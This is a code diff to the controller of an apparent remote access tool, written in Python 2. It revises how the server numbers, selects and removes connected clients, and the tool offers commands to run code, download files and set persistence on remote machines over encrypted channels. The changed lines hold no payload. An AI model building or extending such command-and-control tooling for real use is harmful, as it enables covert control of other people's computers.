@@ -54,7 +54,7 @@ COMMANDS = [ 'client', 'clients', 'download', 'help', 'kill', 'persistence',
 class Server(threading.Thread):
     clients      = []
     alive        = True
-    client_count = 0
+    client_count = 1
     
     def __init__(self, port):
         super(Server, self).__init__()
@@ -73,19 +73,25 @@ class Server(threading.Thread):
     
     def verify_client_id(self, client_id):
         try:
-            return self.clients[int(client_id)]['client_id']
-        except (ValueError, IndexError):
-            print 'Error: Invalid client ID.'
-            return 'None'
+            client_index = next(i for (i, d) in enumerate(self.clients) if \
+                           d['client_id'] == int(client_id))
+            return True, 'Client {} selected.'.format(client_id)
+        except (StopIteration, ValueError):
+            return False, 'Error: Invalid client ID.'
     
     def select_client(self, client_id):
         try:
-            return self.clients[int(client_id)]['client']
+            return self.clients[int(client_id)-1]['client']
         except (ValueError, IndexError):
             print 'Error: Invalid client ID.'
+            return
     
     def get_clients(self):
         return [c for c in self.clients if c['client'].alive]
+    
+    def remove_client(self, conn):
+        conn_to_remove = next(i for i in self.clients if i['client'] == conn)
+        self.clients.remove(conn_to_remove)
 
 
 class ClientConnection(threading.Thread):
@@ -102,21 +108,19 @@ class ClientConnection(threading.Thread):
         if not self.alive:
             print 'Error: Client not connected.'
             return
+    
+        # kill client connection
+        if cmd == 'kill':
+            self.conn.close()
+            return
         
         # send prompt to client
         self.conn.send(crypto.AES_encrypt(prompt, self.dh_key))
         
-        # kill client connection
-        if cmd == 'kill':
-            kill_option = raw_input('Kill this client connection (y/N)? ')
-            if kill_option[0].lower() == 'y':
-                self.conn.close()
-        
         # results of a command
-        elif cmd == 'run':
+        if cmd == 'run':
             recv_data = self.conn.recv(4096)
             print crypto.AES_decrypt(recv_data, self.dh_key).rstrip()
-        
         
         # download a file
         elif cmd == 'download':
@@ -153,7 +157,7 @@ def main():
     args    = vars(parser.parse_args())
     port    = args['port']
     
-    curr_client_id  = 'None'
+    curr_client_id  = '?'
 
     # print banner all sexy like
     for line in BANNER.split('\n'):
@@ -198,9 +202,10 @@ def main():
 
         # select client
         elif cmd == 'client':
-            new_client_id = server.verify_client_id(action)
-            if new_client_id != 'None':
-                curr_client_id = new_client_id
+            success, message = server.verify_client_id(action)
+            if success:
+                curr_client_id = action
+            print message
             continue
         
         # list clients
@@ -211,13 +216,18 @@ def main():
             continue
 
         # require client id
-        if curr_client_id == 'None':
+        if curr_client_id == '?':
             print 'Error: Invalid client ID.'
             continue
         
         # send data to client
         client = server.select_client(curr_client_id)
         client.send(prompt, cmd, action)
+        
+        # reset client id if client killed
+        if cmd == 'kill':
+            server.remove_client(client)
+            curr_client_id = '?'
 
 
 if __name__ == '__main__':
